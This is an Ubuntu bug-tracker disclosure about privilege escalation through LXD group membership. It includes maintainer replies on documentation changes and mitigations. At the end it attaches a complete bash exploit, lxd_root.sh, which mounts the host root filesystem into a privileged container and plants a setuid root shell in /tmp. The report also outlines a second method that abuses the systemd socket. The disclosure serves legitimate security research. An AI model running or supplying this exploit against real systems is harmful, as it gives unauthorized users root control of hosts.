@@ -1,0 +1,212 @@
+Bug #1829071: Privilege escalation via LXD (local root exploit)
+
+URL: https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071
+
+Metadata: security_related=true; information_type=Public Security; targets=lxd (Ubuntu) (Won't Fix, Undecided)
+
+Description:
+Hello Ubuntu team,
+
+I'm a big fan of the LXD snap and am quite enjoying the technology. Below is a brief write-up of an issue I believe you may want to review. Thanks for your time and your hard work on such an amazing OS.
+
+Any member of the local `lxd` group can immediately escalate their privileges to root on the host operating system. This is regardless of whether or not that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.
+
+This issue is not about container break-outs and requires an attacker to already have local access to the system and be a member of the `lxd` user group.
+
+LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match privileges of the calling user. There are multiple methods to exploit this. One of them is to use the LXD API to mount the host's root filesystem into a container. This gives a low-privilege user root access to the host filesystem. This is demonstrated in the exploit attached.
+
+To use the attached exploit, first launch an LXC container using LXD. Then, run `lxd_root.sh <container name>` as a member of the `lxd` user group.
+
+There are other, slightly more in-depth, exploitation methods as well. An example would be to create an LXD proxy device that maps a UNIX socket on the host OS into the container. This mapping will be done using a root process, so that a low-privilege user can simply use the `lxc` command to enter that container and communicate with the socket using root's peer credentials. Using this strategy, one could obtain root-level command execution by speaking to systemd's private socket, for example, linking a new malicious service and starting it. I've built a very rough proof of concept to confirm this works as well, but it is not quite ready to share.
+
+The LXD package maintainers are aware of this and have deemed it not a security issue. Some examples of existing public discussions are:
+ - https://github.com/lxc/lxd/issues/2003
+ - https://github.com/lxc/lxd/issues/3844
+
+I'm raising this issue on the Ubuntu bug tracker as it is a Canonical-sponsored project and Ubuntu users are told to add users to this account without warning them that it breaks Ubuntu's intended security model. Some examples are here:
+ - https://blog.ubuntu.com/2015/04/28/getting-started-with-lxd-the-container-lightervisor
+ - https://help.ubuntu.com/lts/serverguide/lxd.html
+
+And of course the official LXD getting started guide here:
+ - https://linuxcontainers.org/lxd/getting-started-cli/
+
+The links above states `If the "lxd" group is missing on your system, create it, then restart the LXD daemon. You can then add trusted users to it. Anyone added to this group will have full control over LXD.` When, in fact, it should state that anyone added to this group will have full control over the host OS, bypassing intended privileged access checks like a sudo password requirement.
+
+I think it would be worthwhile making this extremely clear in all official Ubuntu documentation and blogs, as well.
+
+From my perspective, this looks like a typical root exploit worthy of a CVE and a customer notification. I'm submitting this as a private bug so that you can review before making public. As the vulnerability has already been discussed on GitHub, the issue of course is already in the public domain.
+
+Thanks for reading!
+
+Discussion:
+Message 2 | Author: chris.moberly | Subject: Re: Privilege escalation via LXD (local root exploit)
+(empty)
+
+---
+Message 4 | Author: chris.moberly | Subject: Re: Privilege escalation via LXD (local root exploit)
+Just a note, others who have found and are providing details on how to exploit this:
+- https://reboare.github.io/lxd/lxd-escape.html
+- https://calap.co/blog/hackistanbul-ctf-brazil-writeup--2018-09-10.html
+
+---
+Message 5 | Author: seth-arnold | Subject: Re: Privilege escalation via LXD (local root exploit)
+Hello Chris, good to hear from you again.
+
+I believe the LXD team considers lxd group access equivalent to root access.
+
+Stéphane, can you comment further?
+
+Thanks
+
+---
+Message 6 | Author: stgraber | Subject: Re: [Bug 1829071] [NEW] Privilege escalation via LXD (local root exploit)
+The logic is based (as in copy/pasted) from what was done for libvirt
+with libvirtd offering similar privileges to lxd as far as being able to
+quickly become root on the system.
+
+If this is considered to be an actual issue, then we need to look at all
+packages in the archive which rely on the same logic to add existing
+users of the admin & sudo groups into their own group for interaction
+with a privileged daemon that can allow escalation to root.
+
+Worth noting that the LXD snap while it does create the group, doesn't
+add users to it (as finding a suitable base group that works on all
+distros proved difficult).
+
+---
+Message 7 | Author: chris.moberly | Subject: Re: Privilege escalation via LXD (local root exploit)
+Hi guys
+
+Thanks for the quick reply. I understand that the developers consider the lxd group as equivalent to root. I dont think this is made clear to system administrators, though. I think most would appreciate a heads up that they are turning users into root. Even a documentation update as mentioned in my initial report would be a major improvement.
+
+Docs talking about things like unprivileged containers should also include this info. These are read by folks probably intending to build secure environments, not realising that their "unprivileged" set has actually reduced overall system security.
+
+---
+Message 8 | Author: chris.moberly | Subject: Re: Privilege escalation via LXD (local root exploit)
+Hello again folks,
+
+I just noticed the LXD snap is included in a default installation of Ubuntu 19.04 Server. I really don't mean to pick on LXD (I actually really love the tool and think the team is doing awesome work), but I want to make a few points clear:
+
+- In default installations of Ubuntu, users who follow the official documentation to create their first LXD container are introducing a privilege escalation vulnerability on their systems with no warning.
+- Users who follow guides to create "unprivileged" containers are in fact creating containers under the context of their accounts that are members of the LXD group, which is essentially root due to multiple vulnerabilities.
+- Savvy attackers have been able to figure this out using Google for at least two years now.
+- I have multiple fully working exploits (including the new attack leveraging relayed UNIX socket creds) and a detailed technical write-up I am ready to publish.
+
+If the stance is still "this is not a security issue" - I understand and respect that, and will assume there is no issue with publishing the exploits for other security researchers.
+
+Thanks again for reading, I know you are all quite busy juggling many projects.
+
+Thanks!
+
+---
+Message 9 | Author: cbrauner | Subject: Re: Privilege escalation via LXD (local root exploit)
+Would like to hear what Jann thinks about this too.
+
+---
+Message 10 | Author: stgraber | Subject: Re: Privilege escalation via LXD (local root exploit)
+So far we've done some tweaks to the following documents:
+ - https://linuxcontainers.org/lxd/getting-started-cli/#access-control
+ - https://lxd.readthedocs.io/en/latest/security/
+ - https://github.com/lxc/lxd#security
+
+---
+Message 11 | Author: chris.moberly | Subject: Re: Privilege escalation via LXD (local root exploit)
+This is great, thank you for such quick action. I think this is a definite improvement.
+
+It is still my personal opinion that these are legitimate privilege escalation vulnerabilities, but at least this provides users with a bit of warning.
+
+As a final thought:
+
+- Specifically related to UNIX socket in the proxy device: root processes are allowed to choose which peer credentials are sent in socket message ancillary data. LXD could be designed to pass the creds of the user who instantiated the proxy connection, as opposed to root creds. This would mitigate the issue.
+
+- Specifically to mounting the filesystem. The mount could be done in such a way to replicate the privileges of the initiating user. This would mitigate the issue.
+
+I will update my write-up to state that documentation has been clarified and that there are no plans for remediate these issues.
+
+---
+Message 12 | Author: chris.moberly | Subject: Re: Privilege escalation via LXD (local root exploit)
+Hi everyone,
+
+Any objections to switching this bug to public? The bug remains unclassified.
+
+---
+Message 13 | Author: alexmurray | Subject: Re: Privilege escalation via LXD (local root exploit)
+Since this is already public via other sources I have no objections - I would like to see Chris' suggestions in comment:10 investigated by the LXD team to see if these would be suitable as future features to try and attenuate the authority which comes via lxd.
+
+---
+Message 14 | Author: chris.moberly | Subject: Re: Privilege escalation via LXD (local root exploit)
+Thanks everyone! I appreciate you time and attention on this. Thanks again for your hard work on the LXD project in general, it's a great tool.
+
+---
+Message 15 | Author: stgraber | Subject: Re: Privilege escalation via LXD (local root exploit)
+For the deb we won't be changing the logic at this point and it's in line with what's done for libvirt, changing behavior at this point would cause more harm than good.
+
+For the snap, we don't auto-add users and as mentioned earlier, have updated our various documentations (those we maintain anyway) to be clearer about the privileges granted to those with access to the API (and mentioning RBAC for those wanting a safer option).
+
+Relevant attachments:
+lxd_root.sh:
+#!/bin/bash
+
+# Local root exploit for systems running LXD (https://linuxcontainers.org)
+# To succeed, you must:
+#   - Be a member of the 'lxd' group, or somehow have write access to the
+#     LXD UNIX socket.
+#   - Have an existing LXC container on the system
+#
+# LXD developers seem to not care. Issue originally identified by simpoir
+# here: https://github.com/lxc/lxd/issues/2003
+# and referenced here: https://github.com/lxc/lxd/issues/3844
+
+USAGE="$(basename "$0") <container name>
+
+The exploit currently requires an existing container."
+
+if [ $# -eq 0 ]
+then
+    echo "$USAGE"
+    exit 0
+fi
+
+echo "[+] Writing a setuid C program to /tmp"
+cat << EOF > /tmp/root.c
+#include <unistd.h>
+int main() {
+	setuid(0);
+	setgid(0);
+	static char *argv[]={"--login",NULL};
+        execv("/bin/bash",argv);
+}
+
+EOF
+
+gcc /tmp/root.c -o /tmp/root
+
+echo "[+] Stopping container $1"
+lxc stop "$1"
+
+echo "[+] Setting container security privilege on"
+lxc config set "$1" security.privileged true
+
+echo "[+] Starting container $1"
+lxc start "$1"
+
+echo "[+] Mounting host root filesystem to $1"
+lxc config device add "$1" rootdisk disk source=/ path=/mnt/root recursive=true
+
+echo "[+] Using container to set SUID on binary"
+lxc exec "$1" -- chown root:root /mnt/root/tmp/root
+lxc exec "$1" -- chmod 4777 /mnt/root/tmp/root
+
+echo "[+] Unmounting host root filesystem from $1"
+lxc config device remove "$1" rootdisk
+
+echo "[+] Resetting container security privilege to off"
+lxc config set "$1" security.privileged false
+
+echo "[+] Stopping the container"
+lxc stop "$1"
+
+echo "[+] Done! Run /tmp/root for a root shell"
+echo "[!] ... and don't forget to delete it when you're done."
+
+exit 0
